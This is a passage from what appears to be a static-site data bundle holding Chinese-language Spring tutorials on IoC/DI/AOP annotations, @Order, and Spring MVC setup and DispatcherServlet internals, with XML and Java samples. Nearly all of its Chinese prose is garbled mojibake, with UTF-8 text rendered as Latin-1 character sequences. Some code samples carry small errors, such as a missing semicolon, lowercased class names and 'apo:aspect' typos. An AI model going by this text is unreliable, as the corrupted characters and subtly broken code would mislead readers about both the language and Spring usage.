testBean: "+ bean.getClass())\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# @AutoConfigureOrder\n\n@AutoConfigureOrder æå®å¤é¨ä¾èµç AutoConfig çå è½½é¡ºåºï¼å³å®ä¹å¨ / META-INF/spring.factories æä»¶ä¸­çéç½® bean ä¼åçº§)ï¼å¨å½åå·¥ç¨ä¸­ä½¿ç¨è¿ä¸ªæ³¨è§£å¹¶æ²¡æä»ä¹ç¨ï¼åæ ·ç @AutoConfigureBefore å @AutoConfigureAfter è¿ä¸¤ä¸ªæ³¨è§£çéç¨èå´å @AutoConfigureOrder ä¸æ ·',normalizedContent:'å¨æ©æç spring ä¸­ï¼æä»¬é½æ¯ä½¿ç¨ xml æ¥è¿è¡ç¸åºç bean ä¾èµæè¿°åå±æ§æè¿°ï¼ä½å¨ spring boot ä¸­å¤§å¤è¿æ¯ä¹ æ¯ä½¿ç¨æ³¨è§£çæ¹å¼æ¥å®ç°ï¼é£è¿éæå°±æ¥æ»ç»ä¸å¨ spring çå½å¨æä¸­ï¼æåªäºç±»æä¾äºæ©å±å¯ä»¥ç»æä»¬å®ç°ï¼ä»¥ååå xml çæ¹å¼åæ³¨è§£æ¹å¼çä¸¤ç§å®ç°æ¹å¼ã\n\n\n# spring ioc\n\n\n# @bean\n\n<bean id="student" class="com.xinhua.study.bean.student" scope="prototype" init-method="init()" destroy-method="destroy()"/>\n\n\n1\n\n\n\n# @scope\n\nscope="singleton/prototype"\n\n\n1\n\n\n\n# @postconstruct\n\ninit-method\n\n\n1\n\n\n\n# @predestroy\n\ndestroy-method\n\n\n1\n\n\n\n# spring di\n\nautowired+qualifier=resource è¿å°±æ¯ä»ä»¬ä¸èçå³ç³»ï¼autowired æ ¹æ®ç±»åæ¾å®ç°ç±»ï¼ä¸ä¸ªæ¥å£æå¤ä¸ªå®ç°ç±»æ¶éè¦éè¿ qualifier æ¥ææéè¦åªä¸ªå®ç°ç±»ï¼è¿æ¯å°±éè¦ autowired+qualifier ä¸èµ·ä½¿ç¨æå¯ä»¥ãresource åæ¯ä¸å£°æåç§°æ¶æç§ç±»åæ¥æ¾ææä¸ autowired ç¸åï¼å£°æåç§°æ¶å°±ç­äº autowired+qualifier çç»å\n\n\n# @autowired\n\n@autowired å¯ä»¥åç¬ä½¿ç¨ãå¦æåç¬ä½¿ç¨ï¼å®å°æç±»åè£éãå æ­¤ï¼å¦æå¨å®¹å¨ä¸­å£°æäºå¤ä¸ªç¸åç±»åç beanï¼åä¼åºç°é®é¢ï¼å ä¸º @autowired ä¸ç¥éè¦ä½¿ç¨åªä¸ª bean æ¥æ³¨å¥ãå æ­¤ï¼ä½¿ç¨ @qualifier ä¸ @autowired ä¸èµ·ï¼éè¿æå® bean åç§°æ¥éæå®éè£éç bean\n\nref="ç±»å"\n\n\n1\n\n\n\n# @qualifier\n\n@qualifier é»è®¤æåç§°è£éï¼è¿ä¸ªæ³¨è§£æ¯å±äº spring çï¼ï¼value é»è®¤ @qualifier (value = "") ç©ºå¼ã\n\nref="ç±»å"\n\n\n1\n\n\n\n# @resource\n\n@resourceï¼è¿ä¸ªæ³¨è§£å±äº j2ee çï¼ï¼é»è®¤æç§åç§°è¿è¡è£éï¼åç§°å¯ä»¥éè¿ name å±æ§è¿è¡æå®ï¼ å¦ææ²¡ææå® name å±æ§ï¼å½æ³¨è§£åå¨å­æ®µä¸æ¶ï¼é»è®¤åå­æ®µåè¿è¡æç§åç§°æ¥æ¾ï¼å¦ææ³¨è§£åå¨ setter æ¹æ³ä¸é»è®¤åå±æ§åè¿è¡è£éã å½æ¾ä¸å°ä¸åç§°å¹éç bean æ¶ææç§ç±»åè¿è¡è£éãä½æ¯éè¦æ³¨æçæ¯ï¼å¦æ name å±æ§ä¸æ¦æå®ï¼å°±åªä¼æç§åç§°è¿è¡è£éã\n\nref="ç±»å"\n\n\n1\n\n\n\n# @value\n\nç»åºæ¬æ°æ®ç±»åèµå¼\n\nref="åºç¡æ°æ®ç±»å"\n\n\n1\n\n\n\n# spring aop\n\n\n# @aspect\n\nå£°æçé¢\n\napo:aspect\n\n\n1\n\n\n\n# @before\n\nåç½®éç¥\n\napo:before\n\n\n1\n\n\n\n# @afterreturning\n\nåç½®æ­£å¸¸éç¥\n\naop:after-returning\n\n\n1\n\n\n\n# @afterthrowing\n\nåç½®å¼å¸¸éç¥\n\naop:after-throwing\n\n\n1\n\n\n\n# @after\n\næç»éç¥\n\naop:after\n\n\n1\n\n\n\n# @around\n\nç¯ç»éç¥\n\naop:around\n\n\n1\n\n\n\n# å¶ä»æ³¨è§£\n\n\n# @order\n\næå¼å§ order æ³¨è§£ç¨äºåé¢çä¼åçº§æå®ï¼å¨ 4.0 ä¹åå¯¹å®çåè½è¿è¡äºå¢å¼ºï¼æ¯æéåçæ³¨å¥æ¶ï¼æå®éåä¸­ bean çé¡ºåºï¼å¹¶ä¸ç¹å«æåºäºï¼å®å¯¹äºåå®ä¾ç bean ä¹é´çé¡ºåºï¼æ²¡æä»»ä½å½±åã\n\næ³¨è§£ @order æèæ¥å£ ordered çä½ç¨æ¯å®ä¹ spring ioc å®¹å¨ä¸­ bean çæ§è¡é¡ºåºçä¼åçº§ï¼èä¸æ¯å®ä¹ bean çå è½½é¡ºåºï¼bean çå è½½é¡ºåºä¸å @order æ ordered æ¥å£çå½±åï¼\n\n@order æ³¨è§£ä¸è½æå® bean çå è½½é¡ºåºï¼å®éç¨äº aop çä¼åçº§ï¼ä»¥åå°å¤ä¸ª bean æ³¨å¥å°éåæ¶ï¼è¿äº bean å¨éåä¸­çé¡ºåº\n\n# éè¯¯ä½¿ç¨\n\n// éè¯¯ä½¿ç¨æ¹æ³ 1\n@component\n@order(2)\npublic class ordera {\n    public ordera() {\n        system.out.println("************ a ************");\n    }\n}\n\n@component\n@order(1)\npublic class orderb {\n    public orderb() {\n        system.out.println("************ b ************");\n    }\n}\n// éè¯¯ä½¿ç¨æ¹æ³ 2\n@configuration\npublic class orderbeanconfig {\n \n    @order(2)\n    @bean\n    public orderc orderc() {\n        return new orderc();\n    }\n \n    @order(1)\n    @bean\n    public orderd orderd() {\n        return new orderd();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# æ­£ç¡®ä½¿ç¨\n\n@component\n@order(value = 3)\npublic class anobeana implements ibean{\n    public anobeana() {\n        system.out.println("************ anobean a ************");\n    }\n}\n\n@component\n@order(value = 2)\npublic class anobeanb implements ibean{\n \n    public anobeanb() {\n        system.out.println("************ anobean b ************");\n    }\n}\n\n@component\npublic class anobean {\n    public anobean(list<ibean> anobeanlist) {\n        for (ibean bean : anobeanlist) {\n            system.out.println("in ano testbean: "+ bean.getclass())\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# @autoconfigureorder\n\n@autoconfigureorder æå®å¤é¨ä¾èµç autoconfig çå è½½é¡ºåºï¼å³å®ä¹å¨ / meta-inf/spring.factories æä»¶ä¸­çéç½® bean ä¼åçº§)ï¼å¨å½åå·¥ç¨ä¸­ä½¿ç¨è¿ä¸ªæ³¨è§£å¹¶æ²¡æä»ä¹ç¨ï¼åæ ·ç @autoconfigurebefore å @autoconfigureafter è¿ä¸¤ä¸ªæ³¨è§£çéç¨èå´å @autoconfigureorder ä¸æ ·',charsets:{cjk:!0}},{title:"Spring MVC ä¹åºæ¬å·¥ä½åç",frontmatter:{title:"Spring MVC ä¹åºæ¬å·¥ä½åç",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-mvc/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/02.spring%20mv/200.Spring%20MVC%20%E4%B9%8B%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.html",relativePath:"01.æ¡æ¶/01.Spring/02.spring mv/200.Spring MVC ä¹å·¥ä½åç.md",key:"v-808a2772",path:"/spring/spring-mvc/200/",headers:[{level:2,title:"æ­å»º",slug:"æ­å»º",normalizedTitle:"æ­å»º",charIndex:2},{level:2,title:"DispatcherServlet åå§åè®²è§£",slug:"dispatcherservlet-åå§åè®²è§£",normalizedTitle:"dispatcherservlet åå§åè®²è§£",charIndex:2998},{level:2,title:"ç¶å­å®¹å¨",slug:"ç¶å­å®¹å¨",normalizedTitle:"ç¶å­å®¹å¨",charIndex:6566},{level:2,title:"ä»£ç åä»£xmléç½®",slug:"ä»£ç åä»£xmléç½®",normalizedTitle:"ä»£ç åä»£ xml éç½®",charIndex:8920},{level:2,title:"è¯·æ±å®ç°",slug:"è¯·æ±å®ç°",normalizedTitle:"è¯·æ±å®ç°",charIndex:10086}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æ­å»º DispatcherServlet åå§åè®²è§£ ç¶å­å®¹å¨ ä»£ç åä»£xmléç½® è¯·æ±å®ç°",content:'# æ­å»º\n\n 1. éç½® pom.xml\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    \x3c!-- spring åé½æ --\x3e\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.7.10</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n\n    <groupId>com.fengqianrun</groupId>\n    <artifactId>study-springMVC</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    \x3c!-- tomcat è®¤warå --\x3e\n    <packaging>war</packaging>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    </properties>\n\n    <dependencies>\n        \x3c!-- åªä½¿ç¨mvc --\x3e\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-webmvc</artifactId>\n        </dependency>\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n 2. åå»º webapp/WEB-INF ç®å½ï¼å¹¶åå»º web.xml æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!-- è¿ä¸ªæä»¶æ¯tomcatè¦å»è¯»åçæä»¶ï¼æä»¶è·¯å¾å¿é¡»å¨ webapp/WEB-INF ä¸ï¼webappå javaæ¯åçº§ç®å½ --\x3e\n<web-app>\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/WEB-INF/spring.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. åå»º /WEB-INF/spring.xml æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n    <context:component-scan base-package="com.fengqianrun.mvc" />\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. éç½® tomcatï¼Deployment ä¸­éç½® warï¼å¹¶ä¿®æ¹ Application context\n 5. è®¿é® url\n\nè®¿é®å°åä¸º http://ip:port/tomcatéç½®çApplication context/web.xmléçservlet-name/controller/method\n\n\n1\n\n\n\n# DispatcherServlet åå§åè®²è§£\n\nDispatcherServlet ç»§æ¿èª HttpServletBeanï¼å¶æç»ç¶ç±»è¿æ¯ Servletï¼åªæ¯å®ç°äºè§èï¼éåäºä¸äºæ¹æ³ã æ¯å¦ HttpServletBean è¯¥ç±»éåäº init () æ¹æ³ï¼å¨å¯å¨æå® DispatcherServlet çæ¶åï¼ä¼è°ç¨è¢«éåç init æ¹æ³ãæ´ä½ init æµç¨å¦ä¸ï¼\n\næ´ä¸ª DispatcherServlet å è½½æµç¨ï¼\n1. tomcatä¼è°ç¨servletçinit()æ¹æ³\n2. HttpServletBeanéåäºinit()æ¹æ³\n    2.1 è¯»åweb.xmléé¢çåå®¹å¹¶å°è£\n    2.2 æ§è¡æ ¸å¿ initServletBean() æ¹æ³\n    2.3 initServletBean() æ¹æ³è°ç¨ initWebApplicationContext()\n3. initWebApplicationContext æ¹æ³ï¼ç¨äºåå»º context ä¸ä¸æ\n    3.1 è°ç¨findWebApplicationContext()æ¥è¯¢ web.xml æ¯å¦èªå®ä¹äº contextAttribute è¿ä¸ªå±æ§\n    3.2 æ²¡ç¨èªå®ä¹å createWebApplicationContext(rootContext) åå»º org.springframework.web.context.support.XmlWebApplicationContext å®ä¾ï¼å¹¶è·ç¶å®¹å¨ç»å®ã\n    3.3 ç» context è®¾ç½®ç¯å¢ä¿¡æ¯ wac.setEnvironment(getEnvironment());\n    3.4 è®¾ç½®å®ä¹ contextConfigLocation(/WEB-INF/spring.xml) çè·¯å¾\n    3.5 è°ç¨ configureAndRefreshWebApplicationContext() æ¹æ³\n4. configureAndRefreshWebApplicationContext æ¹æ³ï¼éç½®contextä¸ä¸æï¼å¹¶åå§åbean\n    4.1 è®¾ç½®ä¸ä¸æ IDï¼ä¸º`åºç¨åç§°`+`servlet-name`\n    4.2 æå·²æçä¸ä¸æ(cotent)ä»¥åéç½®(config)è®¾ç½®å°æ°çcontextä¸­\n    4.3 ç»æ°çcontextæ·»å ä¸ä¸ªApplicationListenerï¼ä¸»è¦ä¸º ContextRefreshListenerï¼å½ä¸ä¸æå·æ°å®æ¯åéç¥ï¼è¯¥ç±»è¢«éç¥ä¼è°ç¨ **FrameworkServlet.this.onApplicationEvent(event);** æ¹æ³ï¼è¿ä¸ªæ¹æ³å¾éè¦\n    4.4 è°ç¨ refresh() æ¹æ³ï¼æ§è¡ bean çåå§åæä½ï¼springé£ä¸å¥ï¼ï¼æ§è¡å®è°ç¨ this.finishRefresh(); ä¹å°±éç¥å° 4.3 ä¸­ç ContextRefreshListenerå¯¹è±¡å¹¶è°ç¨ FrameworkServlet.this.onApplicationEvent(event);\n5. FrameworkServlet.this.onApplicationEvent(event);è°ç¨å°DispatcherServlet.initStrategies()æ¹æ³å¹¶ä¼æ§è¡ä»¥ä¸åç§æ¹æ³ï¼ \n    initMultipartResolver(context);\n    initLocaleResolver(context);\n    initThemeResolver(context);\n    initHandlerMappings(context); \n    initHandlerAdapters(context);\n    initHandlerExceptionResolvers(context);\n    initRequestToViewNameTranslator(context);\n    initViewResolvers(context);\n    initFlashMapManager(context);\n6. initHandlerMappingsï¼ç¨äºæå·²ç»å è½½å°springå®¹å¨çå¯¹è±¡è¿è¡ææ£ï¼æå®ç°äº @RequestMapping | @Controller çBeanæåºæ¥å¹¶å¾å°ææå®ç°äº@RequestMappingæ³¨è§£çæ¹æ³ æ³¨åå° mappingRegister å®¹å¨ä¸­\n    6.1 ä»å®¹å¨ä¸­è¯»åå°å®ç°äºHandlerMapping.class çBeanï¼è¿éå°±æ¯æ¾æä»¬èªå®ä¹å®ç°äºHandlerMapping.classçBean\n    6.2 å¦ææ²¡æèªå®ä¹ç HandlerMappingï¼ä¼å è½½é»è®¤ç HandlerMappingï¼é»è®¤æ BeanNameUrlHandlerMapping,RequestMappingHandlerMapping,RouterFunctionMapping,ææ¾å°çæ³¨åå° Beanå®¹å¨ä¸­\n        6.2.1 RequestMappingHandlerMapping å¨æ³¨åBeançæ¶åä¼æ§è¡ afterPropertiesSet()æ¹æ³ï¼è¯¥æ¹æ³éé¢ä¼å¾å°ææBeanï¼å¹¶å¤æ­ç±»åæ¯å¦æ¯æ Controller.class æ RequestMapping.class æ³¨è§£ï¼å¦æç¬¦åæ¡ä»¶ä»£è¡¨ä½ æ¯ä¸ä¸ª ControllerHandler\n        6.2.2 å¦ææ¯ä¸ä¸ª ControllerHandlerï¼åè·åè¯¥ç±»ä¸­çæ¹æ³å¹¶å¾å°æåªå«æRequestMapping.classæ³¨è§£çæ¹æ³ï¼å¹¶ä¸è§£ææ³¨è§£ä¸çåæ°,ææ¹æ³æ³¨åå°ä¸ä¸ª mappingRegistry é\n    6.3 BeanNameUrlHandlerMapping æ¯ç± ApplicationContextAware æç¥è°ç¨åå§åæ¹æ³ç\n        6.3.1 BeanNameUrlHandlerMapping å RequestMappingHandlerMapping è§£æçæ¹å¼ä¸ä¸æ ·ï¼BeanNameUrlHandlerMappingå¾å°å®¹å¨ä¸­ææBeanï¼ä¼å¤æ­BeanNameçåç¼ä»¥ \'/\'å¼å¤´å¹¶æ¶éï¼å¹¶ä¸æ³¨åå° handlerMapä¸­\n        6.3.2 BeanNameUrlHandlerMapping åå¶ä»controlleråæ³ä¸ä¸æ ·ï¼å·ä½è¦ç»ç±»å  @Component("/test") å¹¶ä¸è¿æå®ç° implements Controller\n        6.3.3 æ¾å°å¹éæ¡ä»¶çæ¹æ³æä»ç»´æ¤å°èªå·±ç handlerMap ä¸­\n    6.4 æ³¨æ BeanNameUrlHandlerMapping å RequestMappingHandlerMappingç»´æ¤äºä¸åç handler å®¹å¨ï¼æä»¥ç¸åçè¯·æ±è·¯å¾ä¸ä¼æ¥éï¼å¦æç¸åï¼æ§è¡BeanNameUrlHandlerMappingçæ¹æ³ï¼å ä¸ºä¼åçº§æ¯RequestMappingHandlerMappingé å\n7. initHandlerAdaptersï¼åå§åæ¹æ³ä¼åææéè¦çåå¤å¥½å è½½è¿å»\n    7.1 initHandlerAdapters ä»springå®¹å¨ä¸­æ¾å äº @ControllerAdvice çBean\n    7.2 å¾å°Beanåå¤æ­å äº @ModelAttribute çæ³¨è§£ä½ä¸åå«æ @RequestMappingæ³¨è§£çæ¹æ³ å­å° modelAttributeAdviceCacheä¸­\n    7.3 å¾å°Beanåå¤æ­å äº @InitBinder çæ¹æ³ å­å° initBinderAdviceCache ä¸­\n    7.4 ä»å®¹å¶ä¸­å¾å°ææå®ç° RequestBodyAdvice æ ResponseBodyAdvice æ¥å£ï¼è®°å½ä¸æ¥\n    7.5 åå§å HttpRequestHandlerAdapterãSimpleControllerHandlerAdapterãRequestMappingHandlerAdapterãHandlerFunctionAdapter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# ç¶å­å®¹å¨\n\nç¶å­å®¹å¨ï¼å°±æ¯å¨ä¸ä¸ª web.xml éé¢æå®ä¸¤ä¸ª servletï¼å è½½ä¸åç spring.xmlï¼å±äº«ä¸ä¸ª listener ç¶å®¹å¨çå¯¹è±¡ãæ³¨æï¼ç¶å®¹å¨æ¯ä¼å¨ servlet èç¹ä¹åè§£æçãç¶å­å®¹å¨å·ä½å®ç°å¦ä¸ï¼\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!-- è¿ä¸ªæä»¶æ¯tomcatè¦å»è¯»åçæä»¶ï¼æä»¶è·¯å¾å¿é¡»å¨ webapp/WEB-INF ä¸ï¼webappå javaæ¯åçº§ç®å½ --\x3e\n<web-app>\n    \n    \x3c!-- ç¶å®¹å¨ --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n    </listener>\n\n    <context-param>\n        <param-name>contextConfigLocation</param-name>\n        \x3c!-- æè¿°beançæä»¶ --\x3e\n        <param-value>/WEB-INF/spring2.xml</param-value>\n    </context-param>\n\n    \x3c!-- å­1 --\x3e\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/WEB-INF/spring.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n\n    \x3c!-- å­2 --\x3e\n    <servlet>\n        <servlet-name>app1</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/WEB-INF/spring1.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app1</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app1/*</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\nContextLoaderListener ä¼åå»ºä¸ä¸ªå®¹å¨ ApplicationContextï¼è§£æéç½®ç xml æä»¶ï¼èµ° spring å¸¸è§ç Bean å è½½æµç¨ã è¿ä¸ª ApplicationContext ä¼è¢«åä¸º servlet çç¶å®¹å¨è¢«å è½½å° servletContextï¼mapï¼ä¸­ï¼å½ servlet è¢«å è½½çæ¶åä¼åç¶å®¹å¨è¿è¡ç»å®ï¼è¯¦è§ DispatcherServlet åå§åè®²è§£ 3.2\n\n\n# ä»£ç åä»£ xml éç½®\n\næ´ä½å xml æ¯å·®ä¸å¤ç\n\npublic class MyWebApplicationInitializer implements WebApplicationInitializer {\n    \n    @Override\n    public void onStartup(ServletContext servletContext) throws ServletException {\n        // Load Spring web application configuration\n        AnnotationConfigWebApplicationContext context = new AnnotationConfigWebApplicationContext();\n        context.register(AppConfig.class);\n\n        // Create and register the DispatcherServlet\n        DispatcherServlet servlet = new DispatcherServlet(context);\n        ServletRegistration.Dynamic registration = servletContext.addServlet("app", servlet);\n        registration.setLoadOnStartup(1);\n        registration.addMapping("/app/*");\n    }\n\n    @ComponentScan("com.fengqianrun.mvc")\n    public class AppConfig{\n\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nMyWebApplicationInitializer è¢«å è½½æ¯éè¿ SpringServletContainerInitializer å®ç°äº ServletContainerInitializer çè§èï¼å¨ SpringServletContainerInitializer ä¸­æä¸ä¸ª @HandlesTypesï¼éé¢å°±å®ä¹äº WebApplicationInitializerï¼ä¼æè¯¥ç±»å è½½ä¼ å¥ SpringServletContainerInitializer ç onStartup æ¹æ³ï¼è¯¥æ¹æ³éé¢ç»§ç»­è°ç¨å®ç°äº WebApplicationInitializer ç onStartup æ¹æ³\n\n\n# è¯·æ±å®ç°\n\næä»¬é½ç¥éæ©åºåä¸ä¸ª HttpServlet å¹¶å®ç° service () è½¬åå·ä½ doGet doPost å¹¶å®ç°ä¸å¡é»è¾ãDispatcherServlet ä¸æ ·å®ç°äº HttpServlet å¹¶éåäº serviceãdoGetãdoPost ç­æ¹æ³ï¼å®ç°å·ä½æµç¨æ¯ï¼\n\n1. ç±DispatcherServletçç¶ç±»FrameworkServletå·ä½å®ç°äºserviceãdoGetãdoPostæ¹æ³\n2. FrameworkServletä¼åè¢«è°ç¨service()æ¹æ³ï¼è§£ææ¹æ³çè¯·æ±æ¹å¼æ¯ get è¿æ¯ postï¼åè°ç¨HttpServletçservice()æ¹æ³è¿ä¸æ­¥å¤æ­æ¯è°ç¨ doGet è¿æ¯ doPostæ¹æ³\n3. HttpServletå¨è°ç¨FrameworkServletå·ä½å®ç°äºdoGetædoPostæ¹æ³\n    3.1 \n4. doPostå®ç°ä¼è°ç¨FrameworkServletçå­ç±»DispatcherServletçdoServiceæ¹æ³\n    4.1 doService é¦åä¼æå°è¯·æ±çä¿¡æ¯\n    4.2 æcontextæ·»å å° request çè¯·æ±ä¸­\n    4.3 flashMapManager\n    4.4 è°ç¨ doDispatch æ¹æ³\n5. doDispatch\n    5.1 å¾å°é»è®¤çä¸ä¸ª mappingï¼ BeanNameUrlHandlerMapping,RequestMappingHandlerMapping,RouterFunctionMappingï¼è¯¦ç»å¨DispatcherServlet åå§åè®²è§£6.2ä¸­ï¼\n    5.2 ä¾¿å©æ¯ä¸ª mappingï¼å¹¶å¾å°è¯·æ±çè·¯å¾ï¼æ ¹æ®è·¯å¾å»æ¾ handlerï¼è¿ä¸ªhandlerå°±æ¯DispatcherServlet åå§åè®²è§£6.2.2çæ¹æ³ï¼ï¼å¦ææ¯BeanNameUrlHandlerMappingæ¾å°çæ¯Beanï¼RequestMappingHandlerMappingæ¾å°çæ¯ HanlerMethod ç»ä¸ä¸º handler\n    5.3 æ¾å°handleråä¼å°è£ä¸ºä¸ä¸ª handleræ§è¡é¾ï¼è¿ä¸ªæ§è¡é¾åå«äºæ¦æªå¨ï¼æä»¥ç§°ä¸ºé¾\n    5.4 ç±äºè·åç handler æ¯ä¸ä¸ªobjectï¼æ æ³ç¡®å®æ¯BeanNameUrlHandlerMappingçBeanè¿æ¯RequestMappingHandlerMappingçHandlerMethodï¼æä»¥æ§è¡ getHandlerAdapter è¿è¡éé\n        5.4.1 æå·²ç»å è½½ç handlerAdapters è¿è¡ä¾¿å©ï¼DispatcherServlet åå§åè®²è§£ 7.5ï¼\n        5.4.2 æ¯ä¸ª handlerAdapter å®ç°æ¹å¼ä¸ä¸æ ·ï¼ä¼æä¸ªç»ä¸ç supports æ¹æ³æ¥å¤æ­æ¯å¦å®ç°äºä¸å mapping çè¦æ±ï¼å¹¶æ¾å°åéç adapter\n            5.4.2.1 å¦ RequestMappingHandlerMapping å¯¹åºçæ¯ RequestMappingHandlerAdapterï¼adapter ç supportsä¼å¤æ­æ¯å¦æ¯ HandlerMethod çå®ä¾ï¼æ¯åå¾å°è¿ä¸ª adapter\n        5.4.3 handleræ§è¡é¾å¼å§æ§è¡æ¦æªå¨ï¼ä¼éåææçæ¦æªå¨æ§è¡æ§è¡åç½®æ¹æ³ï¼å¦ææ¦æªå¨åç½®æ¹æ³è¿åfalseååé¢ä¸å¨æ§è¡\n        5.4.4 æ¦æªå¨æ§è¡å®æ¯åå°±å¯ä»¥æ§è¡å¾å°ç HandlerAdapter ç handler æ¹æ³ï¼å»çæ­£æ§è¡ controller çæ¹æ³ï¼è¿åå¼ä¼å°è£æ ModelAndView\n            5.4.4.1 æ£æ¥æ¯å¦éå¶äºè¯·æ±æ¹å¼ï¼æ¯å¦åªæ¯æ POST è¯·æ±\n            5.4.4.2 å¤æ­æ¯å¦å¼å¯sessionéï¼ç¨äºå¯¹ææç¸åsessionçè¯·æ±è¿è¡å¹¶åéå¶\n            5.4.4.3 æ§è¡invokeHandlerMethodæ¹æ³\n                5.4.4.3.1 æ¾åº@InitBinderåå»ºä¸ä¸ª binderFactory å·¥åï¼è¯¥å·¥åæ¯å¯¹Methodè¯·æ±åæ°åç±»åè½¬æ¢ï¼æ¾çæ¯å½åMethodæå¨å±ç@InitBinderçè½¬æ¢å¨\n                5.4.4.3.2 